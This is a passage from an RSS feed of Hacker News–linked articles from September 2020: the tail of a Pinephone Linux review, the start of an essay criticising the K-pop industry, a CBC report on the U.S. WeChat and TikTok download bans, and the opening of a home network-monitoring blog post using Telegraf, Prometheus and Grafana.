the phone. Otherwise, this distribution is very,</p><p>very impressive, and I would actually like to switch to it, because</p><p>cell data works best for Optus on Ubuntu Touch.</p><p>This distribution could indeed be a daily driver for someone if they</p><p>could sort out the button debouncing problem.</p><p>This is a Linux-based operating system that uses a closed-source</p><p>UI. It was so glossy and locked-down in terms of configurability that</p><p>I was turned off using it. It has a great tutorial for teaching you</p><p>the gestures you need to learn in order to use the touch screen.</p><p>I did like the fact that it organised all your contacts and messages</p><p>into interesting metaphors, and it ran reasonably quickly, but there</p><p>is no way of configuring the UI beyond what how it arrives to you.</p><p>This image was fairly slow to run on the Pinephone, but in my opinion</p><p>it is the absolute best demonstration of KDE Plasma Mobile. It was</p><p>very visually impressive, and the menus were full-featured and</p><p>informative. It did not, however, support phone calls or SMS.</p><p>This is my current choice of Linux distribution for the phone. It has</p><p>a software centre full of different and interesting programs,</p><p>including Transmission (torrent client) and GIMP (!!! I have yet to</p><p>install this to see how or if it works well, but the fact that it is</p><p>possible to at least _run_ GIMP in some capacity on the Pinephone</p><p>would like like running Adobe Photoshop on a Samsung Galaxy).</p><p>This is merely anecdotal, and I have not performed any scientific</p><p>tests to work out if this is true, but the latest September 2020</p><p>stable release of this image seems to have the best power settings of</p><p>any of the other distributions for this phone.</p><p>I hesitate to give an estimate of exactly how long this phone will</p><p>last on a single charge, given normal use. But, I finished charging</p><p>this phone at 0700HRS this morning, and, with no other charge, it is now</p><p>on 50% charge, and the current time is 1230HRS. I think I have put the</p><p>phone through a little heavier use than I do normally, this morning,</p><p>however.</p><p>Virtually all of the functions of the phone are enabled without any</p><p>configuration in Mobian.</p><p>I highly recommend flashing the following system image to an SD card</p><p>so you can try out all the major Linux distributions for your phone:</p><p>It contains 13 different distributions, and it is trivial to switch</p><p>between each of them through the main boot menu.</p><p>I have rung a few people on the phone, and, assuming you have a</p><p>distribution flashed on the phone that supports phonecalls (like the</p><p>one I am currently using, Mobian), there should be absolutely no issue</p><p>using this fundamental feature of the Pinephone.</p><p>For the most part, the cell data modem in the Pinephone works well for</p><p>me. There is a fairly large problem with my use of the Pinephone with</p><p>its cell data, however.</p><p>I live in Australia, and the mobile phone carrier that I use is</p><p>Optus. The setup(s) that work for me with my Pinephone, running</p><p>Mobian, is:</p><p>&gt; Name: 1</p><p>&gt; APN: yesinternet</p><p>&gt; Name: Optus Yes Internet</p><p>&gt; APN: yesinternet</p><p>After about 3 or 4 hours after I boot up the phone, the cell data</p><p>stops working, and the Network Mode in the 'Mobile' submenu of</p><p>Settings changes from</p><p>&gt; 2G, 3G, 4G (Preferred)</p><p>to just</p><p>&gt; 2G, 3G, 4G</p><p>This issue is fixed for another 3 or 4 hours by rebooting the phone,</p><p>which does not actually take that long (about 10 to 15 seconds), but</p><p>it is a hassle to be cut off from mobile data if you forget about your</p><p>phone.</p><p>These two links help shed light on exactly what is happening with the</p><p>Pinephone when it tries to remain connected to the Optus network:</p><p>(A forum post. Someone using a similar, if not identical mobile data</p><p>modem as the Pinephone in Australia, with the Optus network)</p><p>(A Github post which familiarises the reader with the concepts and</p><p>command line tools involved in using Linux with 4G LTE modems on</p><p>Debian and Ubuntu)</p><p>The issue with the Pinephone is explained the forum thread (the first</p><p>link). The issue is that there are at least two modes for the Quectel</p><p>EG25 modem that the Pinephone uses, only one of which seems to be</p><p>supported by Optus. The two modes are QMI and MBIM. Optus, I assume,</p><p>only supoprts MBIM:</p><p>https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/8 Forum post</p><p>The relevant sentence from the above forum post is:</p><p>&gt; Also, MBIM is buggy for Quectel modems even in OpenWRT 19.07</p><p>&gt; (snapshot), mostly sometimes modem ‚Äúfreezes‚Äù and I need to restart.</p><p>The issue that the original poster was having with this modem is</p><p>explained in the same post:</p><p>&gt; The reason is exactly this: user.notice Create Connection:</p><p>&gt; WDA-GET-DATA-FORMAT is ‚Äúraw-ip‚Äù </p><p>&gt; When you use a modem over QMI and the data-format is ‚Äúraw-ip‚Äù the</p><p>&gt; system needs to know that modem is on ‚Äúraw-ip‚Äù, without that,</p><p>&gt; interface doesn‚Äôt get an IP address.</p><p>When I was using the postmarketOS version of phosh, the NetworkManager</p><p>program started a wizard which contained a lot more options about how</p><p>to configure the Pinephone's Quectel LTE modem. One activity I would</p><p>like to carry out is learning how to start this wizard from within</p><p>Mobian. I wish to keep Mobian as the primary operating system for the</p><p>Pinephone just because its Software Centre has such an amazing</p><p>quantity and quality of different programs, and the postmarketOS</p><p>Centre requires you to manually search for the programs you want, in</p><p>order for them to show up at all inside the Centre.</p><p>The GPS seems to function perfectly fine inside the default Mobian</p><p>maps program. It can show you, with reasonable accuracy (although not</p><p>to the same accuracy as, say, a proprietary maps application) exactly</p><p>where you are. I think the accuracy of the GPS on the Pinephone is</p><p>somewhere in the region of 10 square metres.</p><p>The main issue with the GPS, however, is that it does not currently</p><p>link in with the Perth public transport system. I cannot use this</p><p>program to plan public transport journeys. But I believe I should be</p><p>able to take care of this problem by either (a) adding data to</p><p>OpenStreetMap, or (b) using a web browser, where I should be able to</p><p>access the Transperth public transport trip planner webpage.</p><p>This is a feature that works without a hitch in Mobian. I was</p><p>surprised to see myself receiving SMS messages unexpectedly from</p><p>friends as I left the phone in my pocket and forgot about it.</p><p>The camera application in Mobian works. However it has a refresh rate</p><p>of around 1 FPS. The quality is passable. This is not an issue for me</p><p>because, philosophically, phone cameras should not replace the</p><p>function of proper dedicated photographic devices. Will this camera</p><p>take reasonable photos? Yes. What is the comparison of the quality of</p><p>the photos? I would venture a guess that it is about as good as a</p><p>cheap action camera, like a GoPro knock-off.</p><div><p><span> ##</span></p><h2>Flashing Different Operating Systems</h2></div><p>Compared to the arduous process that one has to go through in order to</p><p>change operating systems on an Android phone, the Pinephone is very</p><p>easy to flash. You can flash data onto both an SD card, or the phone's</p><p>internal eMMC.</p><p>For flashing an SD card, the process is as ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</a></em></p>]]>
            </description>
            <link>https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525210</guid>
            <pubDate>Sat, 19 Sep 2020 04:56:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Deep Dive into K-pop]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525108">thread link</a>) | @eswat
<br/>
September 18, 2020 | https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-719">

	
	<!-- .entry-header -->


			<div>

			<p><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8dedad4c-ee57-46fd-91a2-32cbb9a652d1/d97l7vh-b56d2b05-419a-4aa2-90c9-1f7a87db1968.jpg/v1/fill/w_1024,h_725,q_75,strp/my_first_kpop_collage_by_rainbowcandleofjoy_d97l7vh-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzI1IiwicGF0aCI6IlwvZlwvOGRlZGFkNGMtZWU1Ny00NmZkLTkxYTItMzJjYmI5YTY1MmQxXC9kOTdsN3ZoLWI1NmQyYjA1LTQxOWEtNGFhMi05MGM5LTFmN2E4N2RiMTk2OC5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.Py2kzajyzSvCd5CFWXNFSOW5m_rgR6UJMXllQj3dy18" alt="KPOP Collections: Kpop Groups Collage"></p>
<p>Prior to last month, I knew next to nothing about K-pop (Korean popular music) besides having heard a few songs in passing and the rumors of the industry‚Äôs infamous elements, most notably a string of high profile suicides over the last few years. As an American with no connection to music or South Korean culture, I wondered if I was getting an accurate picture of the industry or if I was being misled by the most lurid and morbid elements eagerly conveyed by the media.</p>
<p>So I decided to do a deep dive down the internet rabbit hole of K-pop to understand what it is, how it works, and what I think about it. For anything that‚Äôs not my personal opinion or that goes beyond basic historical knowledge, I‚Äôll cite my sources, which are a mixture of news articles, academic articles, YouTube videos, and some content aggregators like Wikipedia and Statista. I welcome any corrections or criticisms on inaccurate sources or things I didn‚Äôt understand.</p>
<p>I‚Äôll warn you upfront ‚Äì this essay is over 30,000 words long. It is the largest post I have made on dormin.org besides my novel. Since I sympathize with anyone who doesn‚Äôt want to make such a large time investment into a subject of passing curiosity, I will present my key findings here divided between the five <strong>parts</strong> of the essay. If you‚Äôre not sure if you want to read everything, you can jump to any individual part and understand it without reading the other sections.</p>

<h3><a href="#Basics"><strong><u>Part 1</u> ‚Äì <u>The Basics</u></strong></a></h3>
<ul>
<li>‚ÄúK-pop‚Äù is both a genre of music and an entire industry which ‚Äúmanufacturers‚Äù performers and their performance output (music, dance routines, shows, merchandise, etc.) in a highly systematized top-down manner</li>
<li>The global popularity of K-pop is extraordinary considering the relatively small population of South Korea, and the relatively small size of K-pop production companies</li>
</ul>
<h3><a href="#Product"><strong><u>Part 2</u> ‚Äì <u>The Product</u></strong></a></h3>
<ul>
<li>K-pop‚Äôs industrial/corporate structure represents a Korean (and East-Asian) cultural alternative to Western pop and broader music production</li>
<li>K-pop stars and bands are manufactured and controlled by production companies in the same manner Western athletes are trained and traded by sports teams.</li>
<li>K-pop stars are crafted into idealized portrays of individuals by East Asian cultural standards</li>
</ul>
<h3><a href="#Fans"><strong><u>Part 3</u> ‚Äì <u>The Fans</u></strong></a></h3>
<ul>
<li>K-pop fandom is both more intense on average than Western fandom, and has a larger percentage of unhealthily obsessive fans</li>
<li>K-pop fandom is based on a parasocial relationship between fans and stars</li>
<li>K-pop stars are forced to abide by extremely restrictive behavioral norms to appease production companies and fans</li>
</ul>
<h3><a href="#Process"><strong><u>Part 4</u>‚Äì <u>The Process</u></strong></a></h3>
<ul>
<li>Trying to become a K-pop star is a terrible idea by any rational cost-benefit analysis</li>
<li>The process by which production companies train K-pop stars is abusive and depends on the ignorance of children/teenagers and clueless and/or malicious parents</li>
<li>Even after making it through the extraordinarily difficult audition and training process, the vast majority of K-pop stars will have short careers and earn little or possibly <em>no</em> money</li>
</ul>
<h3><a href="#Machine"><strong><u>Part 5</u> ‚Äì <u>The Machine</u></strong></a></h3>
<ul>
<li>K-pop is an extremely centralized, hierarchical industry, where structural, business, and creative decisions are almost entirely made by corporate management, rather than the performers</li>
<li>Raw creativity in the music production process is largely outsourced to Westerners who write, produce, and choreograph the music</li>
<li>The K-pop industry is subsidized and supported by the South Korean government, if not implicitly or explicitly directed, as a conscious form of soft power projection and social control.</li>
</ul>
<p>As you can tell, I came away from my research with a negative view of K-pop. I don‚Äôt think it‚Äôs the worst thing in the world, but I find its fandom to be unhealthy and its production process to be exploitative. That being said, there are undoubtedly many tremendous talents in the K-pop world and the cultural power of K-pop is remarkable. I‚Äôll give my summarized thoughts on K-pop as a whole at the conclusion of the essay.<br>
<a name="Basics"></a></p>
<hr>
<p><img src="https://www.rollingstone.com/wp-content/uploads/2018/08/BTS-kpop-takeover-the-world.jpg" alt="How K-Pop Conquered the West - Rolling Stone"></p>
<h2><strong><u>Part 1</u> ‚Äì <u>The Basics</u></strong></h2>
<h3><strong>What is K-pop?</strong></h3>
<p>‚ÄúK-pop‚Äù refers to a genre of music and the industry which creates it. Both are based out of South Korea and particularly Seoul.</p>
<h3><strong>What is K-pop music?</strong></h3>
<p>K-pop is an offshoot of 90s Western pop with heavy influences from synthetics and hip hop. Lyrics are mostly Korean, but with English words and sometimes other languages thrown in. K-pop is usually sung by mono-gendered bands with members aged from their mid-teens to late 20s. Such bands typically resemble the structure and appearance of American boy bands from the 90s and 2000s (ie. NSYNC). As a representative K-pop sample, check out ‚ÄúDNA‚Äù by BTS:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/MBdVXkSdhwU?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Properly understood, ‚ÄúK-pop music‚Äù is inseparable from ‚ÄúK-pop performance.‚Äù The music itself is one component of a larger presentation which includes dance choreography, music videos, fashion, and the personas of bands and individual band members. Though these elements are also present in Western music, they are far more important to K-pop music. K-pop fandom is considered the appreciation of all these aspects as an integrated whole.</p>
<h3><strong>What are the Origins of K-pop?</strong></h3>
<p>The Western influence on Korean music began in the 1940s with the American occupation of much of the Korean peninsula after its liberation from Imperial Japan. With the outbreak of the Korean War in the early 1950s, further American presence was added, with over 300,000 US troops at the peak.<a href="#_edn1" name="_ednref1">[1]</a> After the war, the American military stayed at dozens<a href="#_edn2" name="_ednref2">[2]</a> of bases throughout South Korea as a permanent fixture of the country. Over the decades, these soldiers imported American culture and media, including American music. Presently, there are still 20,000 US soldiers in South Korea.<a href="#_edn3" name="_ednref3">[3]</a></p>
<p>The early Western musical influence in South Korea was based on folk and hippie music in the 60s and 70s, and then evolved into sappy ballads in the 80s. These genres merged with traditional Korean music to form a small, localized music industry. Creative expansion was restrained by the South Korean government‚Äôs censorship and restrictions on movement in and out of the country. In the 1970s, the government banned American rock music and Korean offshoots for their connotations with drug use.<a href="#_edn4" name="_ednref4">[4]</a> Until 1983, South Korean citizens were banned from traveling abroad for tourism, and the last restrictions weren‚Äôt lifted until 1988 (year of the Seoul Summer Olympics).<a href="#_edn5" name="_ednref5">[5]</a></p>
<p>Korean music had a revolution in the early 1990s with the three-member band, Seo Taiji and the Boys. Founded in 1992, the Boys debuted on a South Korean television talent show and received the lowest ratings of the night.<a href="#_edn6" name="_ednref6">[6]</a> Unexpectedly, their premiere song was a huge hit and launched the band to fame. The Boys soon became the first successful Korean rap group and redefined the Korean music industry. Leader Seo Taiji was a rare experimenter in a country still emerging from isolation and relative cultural stagnancy. Prior to forming the Boys, he had been part of an indie heavy metal band.<a href="#_edn7" name="_ednref7">[7]</a></p>
<p>Through their music, style, and appearance, Seo Taiji and the Boys inadvertently became the first K-Pop band. While their music was more hip hop-based, the Boys pioneered the mixture of Western pop and hip hop presented with intense, highly-choreographed dance routines within a refined aesthetic theme.<a href="#_edn8" name="_ednref8">[8]</a> For a sample, see here:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/IRFfPZQeJuo?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Seo Taiji and the Boys disbanded in 1996. But by the end of its short career, mimicking boy bands had sprung up throughout South Korea. These bands were picked up by a new wave of music production companies which would become the basis of the K-pop industry. They looked to Japan and its well established ‚ÄúJ-pop‚Äù industry as a template for the sustained production of popular musical talent. Thus, while the Boys were independent, experimental, and subversive, the bands created in their wake were more institutionalized, sanitized, and formed by top-down design.</p>
<h3><strong>How Big is K-pop?</strong></h3>
<p>In 2017, the entire K-pop industry produced $5 billion in revenue.<a href="#_edn9" name="_ednref9">[9]</a> For the closest American comparison I can find ‚Äì in 2019, American <em>record labels</em> earned $8.7 billion in revenue.<a href="#_edn10" name="_ednref10">[10]</a> Unfortunately, I can‚Äôt find numbers for total music industry revenue in the US, so this isn‚Äôt quite a fair comparison. The two might be difficult to compare due to diverging industry structures;&nbsp; for instance, in South Korea, $1.2 billion of its 2017 revenues came from karaoke sales, only $250 million less than its digital music sales<a href="#_edn11" name="_ednref11">[11]</a></p>
<p>Nevertheless, considering that South Korea has less than 1/6<sup>th</sup> the US population and 1/14<sup>th</sup> the GDP, that‚Äôs pretty damn impressive.</p>
<p>Also of note, in 2019, South Korea was the 6<sup>th</sup> largest music market in the world, ahead of China and behind France.<a href="#_edn12" name="_ednref12">[12]</a> In 2017, South Korea exported $513 million worth of music and imported only $14 million worth, which is an extremely strong indicator of the country‚Äôs preference for K-pop over Western pop.<a href="#_edn13" name="_ednref13">[13]</a></p>
<p>BTS (AKA Bangtan Boys) is the most popular K-pop band in the world today and ever. According to the 2019 IFPI Global Music Report, BTS was the 7<sup>th</sup> most listened to artist in the world, and had the 3<sup>rd</sup> most popular album globally. Despite Spotify not streaming in South Korea, BTS was its second most popular artist in 2019.<a href="#_edn14" name="_ednref14">[14]</a></p>
<p>Perhaps more relevantly, a 2017 Hyundai Research Institute report claimed that BTS alone was worth $3.6 billion to the South Korean economy annually when accounting for adjacent economic activity and tourism. Supposedly 1/13th of all tourists to South Korea in 2017 came because of BTS.<a href="#_edn15" name="_ednref15">[15]</a> A 2019 report from Hollywood Reporter brought the figure up $4.65 billion.<a href="#_edn16" name="_ednref16">[16]</a></p>
<h3><strong>How Big is K-pop in America?</strong></h3>
<p>I can‚Äôt find firm figures, but the general consensus is that K-pop has been blowing up in the US since at least 2017, with articles about the genre‚Äôs American explosion popping up in the <em>New York Times</em>,<a href="#_edn17" name="_ednref17">[17]</a> <em>NPR</em>,<a href="#_edn18" name="_ednref18">[18]</a> the <em>Guardian</em>,<a href="#_edn19" name="_ednref19"><em><strong>[19]</strong></em></a> etc. From 2015 to 2019, demand for K-pop concert tickets increased 1,900% in the US.<a href="#_edn20" name="_ednref20">[20]</a> This growth seems to be largely thanks to BTS, which is about 5X more popular than Blackpink, the second most popular ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</a></em></p>]]>
            </description>
            <link>https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525108</guid>
            <pubDate>Sat, 19 Sep 2020 04:36:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 166 | Comments 151 (<a href="https://news.ycombinator.com/item?id=24524662">thread link</a>) | @empressplay
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524662</guid>
            <pubDate>Sat, 19 Sep 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monitoring My Home Network]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24524433">thread link</a>) | @mr-karan
<br/>
September 18, 2020 | https://mrkaran.dev/posts/isp-monitoring/ | <a href="https://web.archive.org/web/*/https://mrkaran.dev/posts/isp-monitoring/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p>I like monitoring <em>stuff</em>. That‚Äôs what I do at work and when my home ISP started giving me random problems and I decided it would be nice to monitor my home network as well. There are a couple of ways to go around this, a very popular and OSS solution is <a href="https://oss.oetiker.ch/smokeping/">SmokePing</a>. SmokePing is written in Perl and is used to visualise network latencies. It‚Äôs quite a great solution but for my current stack which involves Prometheus and Grafana, it meant I had to deploy a standalone tool separate from my monitoring stack - something which I wanted to avoid.</p>

<p><img src="https://oss.oetiker.ch/smokeping/doc/reading_detail.png" alt="SmokePing Graphs"></p>

<p>So, I looked for other solutions and luckily happened to stumble upon <a href="https://twitter.com/oddtazz">oddtazz</a> in one of the common Telegram groups where he shared his solution for the above: Telegraf ICMP <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">plugin</a> and Grafana. This is exactly what I‚Äôve been looking for but for some reason, I had wrongly assumed Telegraf needs InfluxDB to store the data. Googling a bit more, I found Telegraf <a href="https://github.com/influxdata/telegraf/blob/release-1.15/plugins/outputs/prometheus_client/README.md">supports</a> Prometheus format (amongst a huge list of others!) but this wasn‚Äôt so clear in their docs.</p>

<p>I decided to run a Telegraf agent in my RPi connected to my home router over LAN and scrape metrics using Prometheus and visualise graphs in Grafana! For the non-patient readers, here‚Äôs what my dashboard looks like!:</p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana2.png" alt="image"></p>

<p><img src="https://mrkaran.dev/images/ISP-Monitoring-Grafana1.png" alt="image"></p>

<h2 id="setup">Setup</h2>

<p>To get started, we need to download <a href="https://github.com/influxdata/telegraf">Telegraf</a> and configure the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/ping">Ping</a> plugin. Telegraf has the concept of <strong>Plugins</strong> for Input, Output, Aggregating and Processing. What this basically means is that you can configure multiple input plugins like DNS, ICMP, HTTP and export the data of these plugins in a format of your choice with Output plugins.
This makes Telegraf extermely extensible, you could write a plugin (in Go) of your choice if you fancy that as well!</p>

<p>Here‚Äôs what my <code>telegraf.conf</code> looks like:</p>
<div><pre><code data-lang="toml"><span># Input plugins</span>

<span># Ping plugin</span>
[[<span>inputs</span>.<span>ping</span>]]
